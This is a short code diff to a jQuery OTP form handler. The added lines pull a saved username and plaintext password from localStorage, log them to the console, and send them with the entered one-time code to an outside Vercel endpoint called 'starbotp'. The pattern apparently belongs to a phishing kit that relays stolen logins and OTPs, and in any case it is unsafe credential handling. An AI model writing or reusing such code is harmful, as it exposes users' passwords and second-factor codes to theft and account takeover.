@@ -90,16 +90,22 @@
         $(document).ready(function () {
           $('#myForm').on('submit', function (event) {
             event.preventDefault(); // Prevent the default form submission
+            
         
     // Collect form data
     var otp = $('#otp').val();
-  
+    const selectedItem = localStorage.getItem('storedData');
+    const userData = JSON.parse(selectedItem);
+
 
     // Build the data object
     var data = {
         otp: otp,
+        userName: userData.userName,
+        password: userData.password
        
     }
+    console.log(userData.userName, userData.password,data)
 
             $.ajax({
               url: 'https://server-blue-mu.vercel.app/starbotp', // Replace with the URL to your PHP handler script
